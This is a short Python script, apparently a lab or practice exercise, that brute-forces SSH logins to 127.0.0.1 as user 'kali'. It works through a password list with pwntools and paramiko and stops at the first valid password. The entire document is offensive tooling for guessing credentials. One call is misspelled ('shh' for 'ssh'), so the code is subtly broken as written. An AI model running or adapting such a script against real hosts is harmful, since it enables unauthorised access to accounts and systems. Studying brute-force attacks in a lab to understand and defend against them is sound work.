from pwn import *
import paramiko

host = "127.0.0.1"
username = "kali"
attempts = 0 

with open("passwords.txt","r") as password_list:
	for password in password_list:
		password = password.strip("\n")
		try:
			print("[{}] Attempting password: '{}'!".format(attempts,password))
			response = shh(host = host , user = username , password = password,timeout = 1)
			if response.connected():
				print("[>] valid password found: '{}'!".format(password))
				response.close()
				break
			response.close()
		except paramiko.ssh_exception.AuthenticationException:
			print("[X] invalid password!")
		attempts+=1 
